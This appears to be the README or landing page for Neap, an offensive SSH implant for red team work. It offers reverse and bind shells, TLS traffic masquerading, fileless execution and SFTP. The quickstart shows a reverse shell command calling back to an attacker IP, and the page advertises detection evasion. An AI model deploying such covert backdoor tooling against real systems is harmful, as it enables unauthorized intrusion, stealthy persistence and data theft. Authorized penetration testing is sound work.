01 Premise

SSH server that operates quietly in the background.

Neap is a static SSH server for red team engagements. Reverse shells, bind shells, SFTP, port forwarding, and TLS/SNI masquerading — all in a single ~1.2MB binary.

Built for minimal detection footprint while maintaining full SSH protocol compatibility and feature set.

02 Specs

What's in the box.

SHELLS
Reverse · bind shells with full PTY support and session management.
TRANSPORT
TLS/SNI masquerading — appears as HTTPS traffic on the wire.
SFTP
Full SFTP server support for file transfers and remote filesystem access.
FORWARDING
Local · remote · dynamic port forwarding with SOCKS5 proxy.
EXECUTION
Fileless execution — run from memory without touching disk.
STACK
Pure Rust · tokio async · static linking · cross-platform builds.
03 Quickstart

Build, deploy, connect.

Neap supports both reverse and bind shell modes with TLS masquerading.

# Build static binary
$ cargo build --release --target x86_64-unknown-linux-musl

# Reverse shell (calls back to attacker)
$ ./neap reverse --host 10.10.14.5 --port 2222 --tls

# Bind shell (listens locally)
$ ./neap bind --port 2222 --tls-cert server.crt --tls-key server.key

# Connect from attacking machine
$ ssh -o StrictHostKeyChecking=no -p 2222 root@target
04 Reference

Command surface and modes.

Full reference for reverse shells, bind shells, SFTP operations, and port forwarding.

REVERSE SHELLS

neap reverse <host>Connect back to attacking machine
--port <n>Callback port (default: 2222)
--tlsEnable TLS transport encryption
--interval <sec>Reconnection interval on failure

BIND SHELLS

neap bindListen for incoming SSH connections
--port <n>Listen port (default: 2222)
--tls-cert <path>TLS certificate for HTTPS masquerading
--tls-key <path>TLS private key

SFTP OPERATIONS

sftp -P 2222 root@targetSFTP client connection
put <local> <remote>Upload files to target
get <remote> <local>Download files from target
ls · cd · mkdir · rmRemote filesystem navigation

PORT FORWARDING

ssh -L 8080:localhost:80Local port forwarding
ssh -R 9090:localhost:22Remote port forwarding
ssh -D 1080SOCKS5 dynamic forwarding
05 Architecture

Async SSH with TLS masquerading.

Built on tokio for async I/O, russh for SSH protocol implementation, and rustls for TLS transport. Single-threaded event loop handles all connections.

src/
main.rs        // CLI interface and mode selection
ssh_server.rs  // SSH protocol implementation
shell.rs       // PTY and shell session handling
sftp.rs        // SFTP server implementation
tls.rs         // TLS masquerading layer
crypto.rs      // Key generation and auth
06 Authorization

Authorized engagements only.

Neap is designed for legitimate red team operations and authorized penetration testing. Use only on systems you own or have explicit written permission to test.

Security issues should be reported through private security advisories.

All connections use secure SSH protocol with proper authentication.
